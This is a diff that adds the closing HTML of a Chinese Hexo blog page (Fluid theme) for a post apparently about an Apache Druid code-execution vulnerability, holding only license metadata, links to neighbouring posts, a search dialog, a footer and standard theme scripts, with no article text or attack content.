+      <div>http://example.com/2023/04/23/Kafka命令执行漏洞二-Apache-Druid-代码执行漏洞/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年4月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/04/24/Kafka%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%80/" title="Kafka命令执行漏洞一">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Kafka命令执行漏洞一</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/04/14/FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/" title="FastJSON反序列化漏洞解析">
+                        <span class="hidden-mobile">FastJSON反序列化漏洞解析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
